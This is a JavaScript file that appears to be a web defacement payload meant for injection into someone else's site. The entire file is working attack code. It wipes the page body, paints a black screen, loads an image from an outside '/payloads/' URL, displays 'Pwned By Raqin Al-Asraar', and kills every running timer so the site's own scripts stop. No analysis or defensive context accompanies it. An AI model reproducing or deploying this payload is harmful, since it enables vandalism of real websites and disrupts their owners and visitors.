// Clear page and show "Pwned" black screen — waits for DOM to be ready
(function () {
    function run() {
        if (!document.body) {
            // extreme edge case: no body at all — create one
            document.appendChild(document.createElement('body'));
        }

        // Remove all body children (safer than innerHTML='')
        while (document.body.firstChild) {
            document.body.removeChild(document.body.firstChild);
        }

        // Style body — black full-screen flex
        document.body.style.cssText = [
            'margin:0',
            'padding:0',
            'background:#000',
            'width:100vw',
            'height:100vh',
            'display:flex',
            'flex-direction:column',
            'justify-content:center',
            'align-items:center',
            'overflow:hidden',
            "font-family:Arial,sans-serif"
        ].join(';');

        // Container
        var container = document.createElement('div');
        container.style.cssText =
            'text-align:center;display:flex;flex-direction:column;align-items:center;gap:30px;';

        // Image
        var image = document.createElement('img');
        image.src = 'https://www.aliabbas.site/payloads/ras.png';
        image.alt = 'Pwned By Raqin Al-Asraar';
        image.style.cssText =
            'max-width:300px;max-height:300px;width:auto;height:auto;display:block;';

        // Heading
        var text = document.createElement('h1');
        text.textContent = 'Pwned By Raqin Al-Asraar';
        text.style.cssText =
            'color:#fff;font-size:3rem;font-weight:bold;margin:0;padding:0;' +
            'text-align:center;letter-spacing:2px;' +
            'text-shadow:0 0 20px rgba(255,255,255,.3);';

        container.appendChild(image);
        container.appendChild(text);
        document.body.appendChild(container);

        // Kill timers (best-effort)
        var id = setTimeout(function () {}, 0);
        while (id--) {
            clearTimeout(id);
            clearInterval(id);
        }
    }

    // ---- wait for DOM readiness ----
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', run, { once: true });
    } else {
        run();   // already 'interactive' or 'complete'
    }
})();
